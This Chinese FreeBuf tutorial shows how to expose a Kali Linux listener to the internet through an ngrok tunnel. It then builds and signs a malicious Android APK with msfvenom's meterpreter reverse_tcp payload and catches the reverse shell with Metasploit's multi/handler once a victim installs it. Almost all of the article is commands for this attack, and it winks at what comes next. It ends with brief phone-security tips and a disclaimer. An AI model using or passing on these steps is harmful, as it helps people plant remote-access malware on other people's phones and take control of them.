*本文原创作者：艾登——皮尔斯，本文属FreeBuf原创奖励计划，未经许可禁止转载
前言:
因为之前作为小白我不会在Kali Linux里面把IP映射出外网，卡在那个地方很久，后来解决了这个问题就写方法出来和大家分享分享。
环境：
Kali Linux系统(https://www.kali.org/downloads/)
Metasploit
Ngrok Linux64位的端口转发工具(https://www.ngrok.cc/)
1.在Kali Linux里面打开https://www.ngrok.cc,下载里面的Linux 64位的端口转发工具，到Kali Linux桌面备用
然后小伙伴需要自己去https://www.ngrok.cc/注册一个帐号来开通一个免费的隧道，用于接下来的端口映射。
2.设置隧道:
隧道协议选择TCP的，本地端口输入Kali Linux 的IP地址而端口号可以任意不要冲突就行了
设置好ngrok隧道之后就打开指定的sunny路径运行端口转发脚本。
./sunny clientid id
这个是端口转发脚本成功运行的样子
3. 用Metasploit生成载有恶意Payload的Android的apk并且签名apk：
在Kali Linux里面打开一个新的窗口输入
msfvenom -p android/meterpreter/reverse_tcp LHOST=free.ngrok.cc LPORT=11*** R > /root/Desktop/123.apk
执行下列命令签名。首先使用密钥工具创建密钥库。
keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
然后使用JARsigner签名APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore 123.apk aliasname
再用JARsigner验证签名
jarsigner -verify -verbose -certs 123.apk
如果你嫌上面的签名apk的步骤很麻烦就直接在手机下载一个MT管理器进行对apk的签名既方便又快捷。
4.使用Metasploit进行测试：
接下来启动metasploit的监听器。执行msfconsole打开控制台。
use exploit/multi/handler Set PAYLOAD android/meterpreter/reverse_tcp SET LHOST 192.168.253.128(Kali的Linux内网IP) SET LPORT 2222(隧道的端口号) Exploit
然后将载有payload的APK发送到手机上安装等待反弹shell
接受反弹shell成功
sessions查看反弹shell
sessions -i [ID]进行回话操作
剩下的大家应该知道怎么做了(眼神暗示)
注:如果你Kali linux的内网IP变了，可以直接在隧道修改成你的内网IP然后在set LHOST设置成你内网IP然后run监听即可。
防范方法：
1. 手机没事尽量不要root。 2. 定期更新手机病毒库，并且进行杀毒。 3. 对于一些app申请的不必要的权限可以给予禁止。 4. 手机直接安装个杀毒软件。
声明：本文仅供技术交流，请勿利用本文章的攻击手法对他人进行攻击，出现一切法律纠纷，与本文作者无关。
*本文原创作者：艾登——皮尔斯，本文属FreeBuf原创奖励计划，未经许可禁止转载